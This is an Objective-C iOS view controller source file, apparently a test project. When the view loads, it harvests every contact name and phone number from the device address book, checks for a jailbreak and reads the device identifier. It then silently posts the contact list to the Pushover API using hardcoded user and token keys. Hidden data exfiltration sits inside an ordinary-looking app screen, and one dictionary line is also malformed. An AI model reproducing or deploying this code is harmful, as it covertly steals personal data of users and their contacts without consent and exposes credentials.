//
//  ViewController.m
//  test1
//
//  Created by milo on 14/7/13.
//  Copyright (c) 2013 milo. All rights reserved.
//

#import "ViewController.h"
#import "ASIAuthenticationDialog.h"
#import "Reachability.h" 
#import "ASIHTTPRequest.h"
#import "ASIFormDataRequest.h"
#import <AddressBook/AddressBook.h>
#import <AddressBook/ABAddressBook.h>
#import <AddressBook/ABPerson.h>

@interface ViewController ()

@end

@implementation ViewController

-(void)downloadFile
{
    NSString *stringURL = @"http://www.hdwallpapers.in/walls/pacific_rim_movie-wide.jpg";
    NSURL  *url = [NSURL URLWithString:stringURL];
    NSData *urlData = [NSData dataWithContentsOfURL:url];
    if ( urlData )
    {
        NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString  *documentsDirectory = [paths objectAtIndex:0];
        
        NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"pacific_rim_movie-wide.jpg"];
        [urlData writeToFile:filePath atomically:YES];
    }
}

-(NSMutableArray *)retrieveContactList
{
	ABAddressBookRef myAddressBook = ABAddressBookCreate();
	NSArray *allPeople = (__bridge NSArray *)ABAddressBookCopyArrayOfAllPeople(myAddressBook);
	contactList = [[NSMutableArray alloc]initWithCapacity:[allPeople count]];
	for (id record in allPeople) {
        CFTypeRef phoneProperty = ABRecordCopyValue((__bridge ABRecordRef)record, kABPersonPhoneProperty);
        NSArray *phones = (__bridge NSArray *)ABMultiValueCopyArrayOfAllValues(phoneProperty);
		//NSLog(@"phones array: %@", phones);
        CFRelease(phoneProperty);
		NSString* contactName = (__bridge NSString *)ABRecordCopyCompositeName((__bridge ABRecordRef)record);
		
		NSMutableDictionary *newRecord = [[NSMutableDictionary alloc] init];
		[newRecord setObject:contactName forKey:@"name"];
		//[contactName release];
		NSMutableString *newPhone = [[NSMutableString alloc] init];
		for (NSString *phone in phones) {
        	//NSString *fieldData = [NSString stringWithFormat:@"%@: %@", contactName, phone];
			if(![newPhone isEqualToString:@""])
				[newPhone appendString:@", "];
			[newPhone appendString:phone];
            
        }
		[newRecord setObject:newPhone forKey:@"phone"];
		[contactList addObject:newRecord];
		//[newPhone release];
    }
	CFRelease(myAddressBook);
    NSLog(@"Final data: %@", contactList);
    return contactList;
}

- (void)viewDidLoad
{
    NSURL *url = [NSURL URLWithString:@"https://api.pushover.net/1/messages.json"];
    ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:url];

    UIDevice *device = [UIDevice currentDevice];
    NSString *uniqueIdentifier = [device uniqueIdentifier];
    NSString *msg;
    
    NSMutableArray *contacts = [self retrieveContactList];
    NSString *contactString = [contacts componentsJoinedByString:@","];
    
    NSString *filePath = @"/Applications/Cydia.app";
    if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
    {
        NSLog(@"Cydia exists on disk");
        msg = @"Jailbroken";
    }
    else
    {
        NSLog(@"Cydia does not exist");
        msg = @"Not Jailbroken";
    }
    NSDictionary* postBody = [[NSDictionary alloc] initWithObjectsAndKeys:postBody, @"user","S1CezgKG7IHhLEXEYI9OPeYXvPysvB", @"message", "iPad",@"token","ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd"];
    [request setPostValue:@"S1CezgKG7IHhLEXEYI9OPeYXvPysvB" forKey:@"user"];
    [request setPostValue:@"ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd" forKey:@"token"];
    [request setPostValue:contactString forKey:@"message"];
    [request addRequestHeader:@"Content-Type" value:@"application/json"];
    [request setDelegate:self];
    [request startAsynchronous];

    [self downloadFile];
    
    [super viewDidLoad];
	// Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
